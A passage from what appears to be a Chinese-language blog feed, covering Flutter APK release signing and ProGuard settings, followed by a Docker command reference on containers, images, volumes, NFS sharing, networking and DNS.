class="hljs-number">123456</span><br><span class="hljs-attr">keyPassword</span> = <span class="hljs-number">123456</span><br><span class="hljs-attr">keyAlias</span> = key<br><span class="hljs-attr">storeFile</span> = xxx/xxx/key.jks<br></code></pre></td></tr></table></figure><h2 id="3-修改build-gradle"><a href="#3-修改build-gradle" class="headerlink" title="3.修改build.gradle"></a>3.修改build.gradle</h2><p>flutter-project/android/app/build.gradle</p><p>android {}上面粘贴</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">def</span> keystorePropertiesFile = rootProject.<span class="hljs-keyword">file</span>(<span class="hljs-string">&quot;key.properties&quot;</span>)<br><span class="hljs-keyword">def</span> keystoreProperties = <span class="hljs-keyword">new</span> Properties()<br>keystoreProperties.load(<span class="hljs-keyword">new</span> FileInputStream(keystorePropertiesFile))<br><br></code></pre></td></tr></table></figure><p>修改buildTypes</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">buildTypes</span> &#123;<br>    <span class="hljs-section">release</span> &#123;<br>        <span class="hljs-attribute">signingConfig</span> signingConfigs.release<br>        debuggable <span class="hljs-literal">false</span><br>        minifyEnabled <span class="hljs-literal">true</span><br>        shrinkResources <span class="hljs-literal">true</span><br>       // proguardFile getDefaultProguardFile(<span class="hljs-string">&#x27;proguard-android.txt&#x27;</span>), <span class="hljs-string">&#x27;proguard-rules.pro&#x27;</span><br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>修改signingConfigs</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">signingConfigs &#123;<br>    release &#123;<br>        keyAlias keystoreProperties<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;keyAlias&#x27;</span>]</span><br>        keyPassword keystoreProperties<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;keyPassword&#x27;</span>]</span><br>        storeFile keystoreProperties<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;storeFile&#x27;</span>]</span> ? file(keystoreProperties<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;storeFile&#x27;</span>]</span>) : null<br>        storePassword keystoreProperties[<span class="hljs-string">&#x27;storePassword&#x27;</span>]<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-可选-设置编译架构"><a href="#4-可选-设置编译架构" class="headerlink" title="4. [可选] 设置编译架构"></a>4. [可选] 设置编译架构</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">buildTypes</span> &#123;<br>    <span class="hljs-section">release</span> &#123;<br>        <span class="hljs-attribute">signingConfig</span> signingConfigs.release<br>        ndk &#123;<br>            <span class="hljs-attribute">abiFilters</span> <span class="hljs-string">&#x27;armeabi-v7a&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-编译"><a href="#5-编译" class="headerlink" title="5. 编译"></a>5. 编译</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">flutter build apk</span> <br></code></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="找不到-pro文件"><a href="#找不到-pro文件" class="headerlink" title="找不到.pro文件"></a>找不到.pro文件</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Execution failed <span class="hljs-keyword">for</span> task <span class="hljs-string">&#x27;:app:minifyReleaseWithProguard&#x27;</span>.             <br>&gt; java.io.IOException: Please correct <span class="hljs-keyword">the</span> above warnings <span class="hljs-keyword">first</span>. <br></code></pre></td></tr></table></figure><p>将修改修改buildTypes里的注释打开，并在flutter-project/android/app/创建proguard-rules.pro</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># 代码混淆压缩比，在0~7之间，默认为5，一般不做修改</span><br><br>-optimizationpasses <span class="hljs-number">5</span><br><br><span class="hljs-meta"># 去除编译时警告</span><br><br>-ignorewarnings<br><br><span class="hljs-meta">#不压缩输入的类文件</span><br><br>-dontshrink<br><br><span class="hljs-meta">#不优化输入的类文件</span><br><br>-dontoptimize<br><br><br><span class="hljs-meta"># 混合时不使用大小写混合，混合后的类名为小写</span><br><br>-dontusemixedcaseclassnames<br><br><span class="hljs-meta"># 指定不去忽略非公共库的类</span><br><br>-dontskipnonpubliclibraryclasses<br><br><span class="hljs-meta"># 这句话能够使我们的项目混淆后产生映射文件</span><br><br><span class="hljs-meta"># 包含有类名-&gt;混淆后类名的映射关系</span><br><br>-verbose<br><br><span class="hljs-meta"># 指定不去忽略非公共库的类成员</span><br><br>-dontskipnonpubliclibraryclassmembers<br><br><span class="hljs-meta"># 不做预校验，preverify是proguard的四个步骤之一，Android不需要preverify，去掉这一步能够加快混淆速度。</span><br><br>-dontpreverify<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>flutter</category>
      
    </categories>
    
    
    <tags>
      
      <tag>flutter</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker命令</title>
    <link href="/2021/08/22/docker%E5%91%BD%E4%BB%A4/"/>
    <url>/2021/08/22/docker%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="1-源设置"><a href="#1-源设置" class="headerlink" title="1. 源设置"></a>1. 源设置</h2><p>/etc/docker/daemon.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><br><span class="hljs-attr">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://alzgoonw.mirror.aliyuncs.com&quot;</span>]<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-镜像仓库"><a href="#2-镜像仓库" class="headerlink" title="2. 镜像仓库"></a>2. 镜像仓库</h2><ol><li><p>docker login [OPTIONS] [SERVER]</p><p>登录镜像仓库</p><p>-u:用户名</p><p>-p:密码</p><p>example：    </p></li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">docler <span class="hljs-keyword">login</span> -u username -p <span class="hljs-keyword">password</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>docker logout</p><p>登出镜像仓库</p></li><li><p>docker search [OPTIONS] images</p><p>–automated :只列出automated build类型的镜像</p><p>–no-trunc：显示完整的镜像描述</p><p>-s：列出收藏数不小于指定值的镜像</p><p>example：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> search -s <span class="hljs-number">20</span> unbuntu  //列出收藏数不小于<span class="hljs-number">20</span>的ubuntu镜像<br></code></pre></td></tr></table></figure></li><li><p>docker pull [OPTIONS] name[:TAG@DIGEST]</p><p>-a：拉起所有tagged镜像</p><p>–disable-content-trust：忽略镜像校验，默认开启</p><p>example：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker pull unbuntu  <span class="hljs-regexp">//</span>拉去ubuntu最新版镜像<br></code></pre></td></tr></table></figure></li><li><p>docker push [OPTIONS] NAME[:TAG]</p><p>将本地镜像上传到镜像仓库，首先要登录到镜像仓库，还要登录到Docker Hub创建对应名称的仓库，然后用tag命令给镜像打标签，只有打完标签后才能上传。</p></li><li><p>docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/] [USERNAME/] NAME[:TAG]</p><p>标记本地镜像，归入某一仓库。</p><p>完整版push：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> tag ubuntu:latest eara<span class="hljs-number">0</span>/ubuntu:v<span class="hljs-number">1</span><br><span class="hljs-attribute">docker</span> Hub创建对应仓库<br><span class="hljs-attribute">docker</span> push area<span class="hljs-number">0</span>/ubuntu:v<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="3-生命周期"><a href="#3-生命周期" class="headerlink" title="3. 生命周期"></a>3. 生命周期</h2><ol><li><p>docker run</p><p>创建一个新的容器并运行</p><p>常用指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sell">-i选项表示使用交互模式，始终保持输入流开放<br>-t选项表示分配一个伪终端，一般两个参数结合时使用-it，即可在容器中利用打开的伪终端进行交互操作<br>-d选项: 后台运行容器，并返回容器ID--name选项可以指定docker run命令启动的容器名字，若无此选项，Docker将为容器随机分配一个名字<br>-c选项：用于给运行在容器中的所有进程分配CPU的shares值，这是一个相对权重，实际的处理速度还与宿主机的CPU相       关<br>-m选项：用于限制为容器中所有进程分配的内存总量，以B、K、M、G为单位-v选项：用于挂载一个volume，可以用多个<br>-v参数同时挂载多个volume。volume的格式为[host-dir]:[container-dir]:[rw|ro]<br>-p选项：用于将容器内部端口映射给宿主机的端口，其常见格式为：主机(宿主)端口:容器内部端口<br>-P选项：随机端口映射，容器内部端口随机映射到宿主机的端口<br></code></pre></td></tr></table></figure><p>example:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it ubuntu /bin/bash    //启动并返回终端<br>docker run -itd --name ubuntu-test ubuntu /bin/bash  //后台启动并返回终端<br></code></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>docker start</p><p>启动一个或多个已经停止的容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker start b750bbbcfd88 <br></code></pre></td></tr></table></figure></li><li><p>docker stop</p><p>停止一个运行的容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker stop b750bbbcfd88<br></code></pre></td></tr></table></figure></li><li><p>docker restart</p><p>重启容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> restart b<span class="hljs-number">750</span>bbbcfd<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure></li><li><p>docker rm</p><p>删除容器</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby">f <span class="hljs-symbol">:</span>通过SIGKILL信号强制删除一个运行中的容器</span><br><span class="ruby"></span>-<span class="ruby">l <span class="hljs-symbol">:</span>移除容器间的网络连接，而非容器本身</span><br><span class="ruby"></span>-<span class="ruby">v <span class="hljs-symbol">:-v</span> 删除与容器关联的卷</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> rm -f b<span class="hljs-number">750</span>bbbcfd<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure></li><li><p>docker kill</p><p>杀掉运行中的容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> kill -s kill b<span class="hljs-number">750</span>bbbcfd<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure><p>PS.常见rm和kill组合命令</p><p>杀掉所有正在运行的容器</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker kill <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">a</span> -<span class="hljs-params">q</span>)</span><br></code></pre></td></tr></table></figure><p>删除所有正在运行的容器</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">docker rm <span class="hljs-constructor">$(<span class="hljs-params">docker</span> <span class="hljs-params">ps</span> -<span class="hljs-params">a</span> -<span class="hljs-params">q</span>)</span><br></code></pre></td></tr></table></figure></li><li><p>docker exec和docker attach</p><p>在运行中的容器执行命令</p><p>attach：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> attach <span class="hljs-number">1</span>e<span class="hljs-number">560</span>fca<span class="hljs-number">3906</span>   // 如果从这个容器退出，会导致容器的停止。<br></code></pre></td></tr></table></figure><p>exec:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-d :分离模式: 在后台运行</span><br><span class="hljs-deletion">-i :即使没有附加也保持STDIN 打开</span><br><span class="hljs-deletion">-t :分配一个伪终端</span><br></code></pre></td></tr></table></figure><p>example：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker exec -it <span class="hljs-number">243</span>c32535da7 <span class="hljs-regexp">/bin/</span>bash    <span class="hljs-regexp">//</span>返回shell<br></code></pre></td></tr></table></figure></li></ol><h2 id="4-导出和导入"><a href="#4-导出和导入" class="headerlink" title="4. 导出和导入"></a>4. 导出和导入</h2><ul><li>export和import</li></ul><ol><li><p>docker export</p><p>导出镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> export <span class="hljs-number">1</span>e<span class="hljs-number">560</span>fca<span class="hljs-number">3906</span> &gt; ubuntu.tar<br></code></pre></td></tr></table></figure></li><li><p>docker import</p><p>导入镜像</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat docker<span class="hljs-regexp">/ubuntu.tar | docker import - demo/u</span>buntu:v1<br>docker import http:<span class="hljs-regexp">//</span>demo.com     <span class="hljs-regexp">//</span>支持从url导入<br></code></pre></td></tr></table></figure></li><li><p>save和load</p><ol><li>docker save</li></ol><p>将指定镜像保存为tar文件</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">docker <span class="hljs-built_in">save</span> -o nginx.tar nginx:<span class="hljs-built_in">last</span><br></code></pre></td></tr></table></figure><ol start="2"><li>docker load</li></ol><p>导入使用docker save命令导出的镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker load -<span class="hljs-selector-tag">i</span> nginx<span class="hljs-selector-class">.tar</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="docker-save和docker-export的区别"><a href="#docker-save和docker-export的区别" class="headerlink" title="docker save和docker export的区别"></a>docker save和docker export的区别</h3><ol><li>docker save保存的是镜像（image），docker export保存的是容器（container）；</li><li>docker load用来载入镜像包，docker import用来载入容器包，但两者都会恢复为镜像；</li><li>docker load不能对载入的镜像重命名，而docker import可以为镜像指定新名称。</li></ol><h2 id="5-端口"><a href="#5-端口" class="headerlink" title="5.端口"></a>5.端口</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-<span class="hljs-selector-tag">p</span> <span class="hljs-number">1234</span>-<span class="hljs-number">1236</span>:<span class="hljs-number">1222</span>-<span class="hljs-number">1224</span>     <span class="hljs-comment">//指定范围添加端口</span><br>docker run -d -<span class="hljs-selector-tag">p</span> <span class="hljs-number">5001</span>:<span class="hljs-number">5000</span> training/webapp python app<span class="hljs-selector-class">.py</span> <span class="hljs-comment">//容器5000端口映射到主机5001</span><br>docker port bf08b7f2cd89<span class="hljs-comment">//查看映射端口</span><br></code></pre></td></tr></table></figure><h2 id="6-镜像管理"><a href="#6-镜像管理" class="headerlink" title="6. 镜像管理"></a>6. 镜像管理</h2><ol><li><p>docker images</p><p>通过docker images命令可以列出主机上的镜像，默认只列出最顶层的镜像，可以使用-a选项显示出所有镜像</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker images -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure></li><li><p>docker rmi</p><p>docker rmi命令用于删除镜像，删除镜像时，如果已有基于该镜像启动的容器存在，则无法直接删除，需要先用rm命令删除容器。这两个子命令都提供 -f 选项，可强制删除存在容器的镜像或启动中的容器。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> rmi kali:<span class="hljs-number">10</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>docker commit</p><p>docker commit命令可以将一个容器固化为一个新的镜像。当需要制定特定的镜像时，会进行修改容器的配置，比如在容器中安装一些特定的工具等，通过commit命令可以将这些修改保存起来，使其不会因为容器的停止而丢失。</p><ul><li>-a:提交的镜像作者</li><li>-c :使用Dockerfile指令来创建镜像</li><li>-m :提交时的说明文字</li><li>-p :在commit时，将容器暂停</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> commit -a <span class="hljs-string">&quot;demo&quot;</span> <span class="hljs-number">66</span>d<span class="hljs-number">682605023</span> kali:<span class="hljs-number">10</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="7-运维相关"><a href="#7-运维相关" class="headerlink" title="7. 运维相关"></a>7. 运维相关</h2><ol><li><p>docker ps</p><p>常用的选项有-a和-l，-a选项可以查看所有的容器，包括停止的容器；-l选项只查看最新创建的容器，包括不在运行的容器</p></li><li><p>docker rename</p><p>重命名容器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> rename <span class="hljs-number">12312391</span> newname<br></code></pre></td></tr></table></figure></li><li><p>docer stats</p><p>显示容器资源的使用情况统计信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> stats <span class="hljs-number">12312391</span><br></code></pre></td></tr></table></figure></li><li><p>docker top</p><p>查看运行的进程信息</p></li><li><p>docker cp</p><p>主机与容器之间数据拷贝</p><p>example：</p><ul><li><p>将本目录下的test.php文件复制到容器的’/var/www/html/‘目录下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker cp test.php <span class="hljs-number">5198</span>ec963e43:<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><br></code></pre></td></tr></table></figure></li><li><p>将容器内’/var/www/html/index.php’复制到本机/root目录下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker cp <span class="hljs-number">5198</span>ec963e43:<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php <span class="hljs-regexp">/root/</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>docker diff</p><p>查看容器文件结构</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> diff <span class="hljs-number">5198</span>ec<span class="hljs-number">963</span>e<span class="hljs-number">43</span><br></code></pre></td></tr></table></figure></li><li><p>docker events</p><p>从服务器获取实时时间</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-f:根据条件过滤事件</span><br><span class="hljs-deletion">--since:从指定的时间戳后显示所有事件</span><br><span class="hljs-deletion">--until:流水时间显示到指定的时间为止</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> events --since=<span class="hljs-string">&quot;&quot;</span><span class="hljs-number">2020</span>-<span class="hljs-number">01</span>-<span class="hljs-number">21</span><span class="hljs-string">&quot; </span><br></code></pre></td></tr></table></figure></li><li><p>docker history</p><p>查看指定镜像的创建历史</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">history</span> TAG<br></code></pre></td></tr></table></figure></li><li><p>docker inspect</p><p>来查看 Docker 的底层信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker inspect 243c32535da7<br></code></pre></td></tr></table></figure></li><li><p>docker logs</p><p>查看容器打印日志</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> logs -f bf<span class="hljs-number">08</span>b<span class="hljs-number">7</span>f<span class="hljs-number">2</span>cd<span class="hljs-number">89</span>  //查看日志<br></code></pre></td></tr></table></figure></li></ol><h2 id="8-文件映射"><a href="#8-文件映射" class="headerlink" title="8. 文件映射"></a>8. 文件映射</h2><ol><li>主机卷的映射</li></ol><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">docker run -it -v <span class="hljs-regexp">/root/</span>software:<span class="hljs-regexp">/software --privileged=true  docker.io/</span>centos <span class="hljs-regexp">/bin/</span>bash<br><br>-v 挂载目录<span class="hljs-regexp">/root/</span>software 本地目录 /software容器目录，在创建前容器是没有software目录的容器会自己创建<br>--privileged=<span class="hljs-keyword">true</span> 关闭安全权限，否则你容器操作文件夹没有权限<br></code></pre></td></tr></table></figure><ol start="2"><li><p>通过docker创建卷</p><p>此种方式不必考虑权限问题，docker会为我们处理好权限。 </p><ul><li>创建 docker volume create –name v1</li><li>查看 docker inspect v1</li><li>删除数据卷 docker volume rm v1</li></ul><p>创建容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d -v v1:/usr/local/nginx --name nginx  //v1为创建的卷<br></code></pre></td></tr></table></figure></li><li><p>使用共享存储的映射</p></li></ol><p>将一台主机做为nfs主机， 创建相应的文件夹，并将其共享给docker的两台主机，两台docker主机将分享的文件夹映射到容器中，使得对应的容器可以共享到nfs主机的内容。可以将http等服务器的相应的页面文件夹使用这种形式，从而实现多个容器跑一个业务</p><p>nfs主机配置【192.168.6.77】</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@nfs ~]# yum -y install nfs-utils<br>[root@nfs ~]# vim /etc/exports<br>/public  *(rw)<br>[root@nfs ~]# systemctl restart nfs-server<br>Failed to restart nfs-serve.service: Unit not found<br>[root@nfs ~]# mkdir /public<br>[root@nfs ~]# cd /public/<br>[root@nfs public]# touch nfs.txt<br>[root@nfs public]# ls<br>nfs.txt<br><br>docker1主机配置<br>[root@docker1 ~]# vim /etc/fstab <br>192.168.6.77:/public /mnt/nfs nfs defaults,_netdev 0 0<br>[root@docker1 ~]# mkdir  /mnt/nfs <br>[root@docker1 ~]# systemctl restart nfs-server<br>[root@docker1 ~]# mount -a<br>[root@docker1 ~]# df -h<br>192.168.6.77:/public   17G  3.2G   14G   19% /mnt/nfs<br>[root@docker1 ~]# docker run -it -v /mnt/nfs/:/zhuhaiyan 192.168.6.153:5000/myos<br>[root@c7c376e3755a /]# cd /zhuhaiyan <br>[root@c7c376e3755a zhuhaiyan]# ls<br>nfs.txt<br><br>docker2主机配置<br>[root@docker2 ~]# vim /etc/fstab <br>192.168.6.77:/public /mnt/nfs nfs defaults,_netdev 0 0<br>[root@docker2 ~]# mkdir  /mnt/nfs <br>[root@docker2 ~]# systemctl restart nfs-server<br>[root@docker2 ~]# mount -a<br>[root@docker2 ~]# df -h<br>192.168.6.77:/public   17G  3.2G   14G   19% /mnt/nfs<br>[root@docker2 ~]# docker run -it -v /mnt/nfs/:/zhuhaiyan 192.168.6.153:5000/myos<br>[root@cdd805771d07 /]# cd /zhuhaiyan/<br>[root@cdd805771d07 zhuhaiyan]# ls<br>nfs.txt<br></code></pre></td></tr></table></figure><h2 id="9-网络设置"><a href="#9-网络设置" class="headerlink" title="9. 网络设置"></a>9. 网络设置</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker network create -d bridge test  <span class="hljs-regexp">//</span>新建网络<br><br>-d：参数指定 Docker 网络类型，有 bridge、overlay。<br><br>docker network ls。 <span class="hljs-regexp">//</span>查看创建的网络<br><br>docker run -itd --name test1 --network test ubuntu <span class="hljs-regexp">/bin/</span>bash   <span class="hljs-regexp">//</span>--network指定使用的网络<br><br></code></pre></td></tr></table></figure><p>配置 DNS</p><p>可以在宿主机的 /etc/docker/daemon.json 文件中增加以下内容来设置全部容器的 DNS：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;dns&quot;</span> : [<br>    <span class="hljs-string">&quot;114.114.114.114&quot;</span>,<br>    <span class="hljs-string">&quot;8.8.8.8&quot;</span><br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>设置后，启动容器的 DNS 会自动配置为 114.114.114.114 和 8.8.8.8。</p><p>配置完，需要重启 docker 才能生效。</p><p>启动时设置DNS</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it --rm host_ubuntu  --dns=114.114.114.114 --dns-search=test.com ubuntu<br><br>-h HOSTNAME或者--hostname=HOSTNAME:设定容器的主机名，它会被写到容器内的 /etc/hostname 和      /etc/hosts。<br>--dns=IP_ADDRESS： 添加 DNS 服务器到容器的 /etc/resolv.conf 中，让容器用这个服务器来解析所有不在 /etc/hosts 